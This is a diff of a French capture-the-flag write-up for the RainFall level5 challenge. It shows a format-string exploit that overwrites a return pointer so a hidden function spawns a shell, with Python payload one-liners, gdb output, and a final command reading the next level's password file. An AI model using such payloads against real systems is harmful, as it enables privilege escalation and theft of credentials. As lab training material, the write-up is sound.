@@ -1,30 +1,6 @@
 # level5
 
 On décompile l'exécutable du répertoire avec ghidra.
-```
-void o(void)
-{
-  system("/bin/sh");
-                    // WARNING: Subroutine does not return
-  _exit(1);
-}
-
-void n(void)
-{
-  char local_20c [520];
-
-  fgets(local_20c,0x200,stdin);
-  printf(local_20c);
-                    // WARNING: Subroutine does not return
-  exit(1);
-}
-
-void main(void)
-{
-  n();
-  return;
-}
-```
 
 On constate le meme style de faille, à savoir, "format string".
 Cette fois-ci une fonction qui n'est pas appelé dans le programme parent, lance un shell.
@@ -112,6 +88,7 @@ gs             0x33	51
 
 ## esp pointe vers une adresse
 
+
 (gdb) x/2i 0x080484f8
 0x80484f8 <n+54>:	movl   $0x1,(%esp)
 0x80484ff <n+61>:	call   0x80483d0 <exit@plt>
@@ -124,19 +101,12 @@ Et quand le programme arrivera a "0xbffff50c", le code de la fonction o sera exe
 
 Nous allons écrire cette adresse avec la meme technique que précedemment (%n).
 Le problème est que le nombre d'espaces à inséré est conséquent.
-"0x080484a4" en décimal = "134513828".
-Nous allons donc pour éviter d'attendre, spliter de 4 octets a 2 octets. Avec la technique suivante :
-```
-level5@RainFall:~$ python -c 'print("\x0c\xf5\xff\xbf" + "\x0e\xf5\xff\xbf" + "%33948x" + "%4$hn" + "%33632x" +  "%5$hn" )' > /tmp/exploit2
-```
-Nous convertissons "0x84a4" que nous mettons dans "\x0c\xf5\xff\xbf" (33956 - 8(les adresses)). Puis "0x0804" dans "\x0e\xf5\xff\xbf".
-Normalement pour trouver le nombre des espaces a rentrer pour le deuxieme, il faut utiliser la formule (1 + 2) - 1.
-Ici le fait que "0804" soit plus petit que 84a4, nous devons repartir de 0. Ici j'ai fais au feeling, en testant beaucoup de fois.
+"0x080484a4" en décimal = "134513828" - 4 (adresse).
 
 
 ```
-level5@RainFall:~$ cat /tmp/exploit2 - | /home/user/level5/level5
-
+python -c 'print("\x0c\xf5\xff\xbf" + "%134513824x" + "%4$hn" )' > /tmp/exploit3
+cat /tmp/exploit3 - | /home/user/level5/level5
 id
 uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
 cat /home/user/level6/.pass
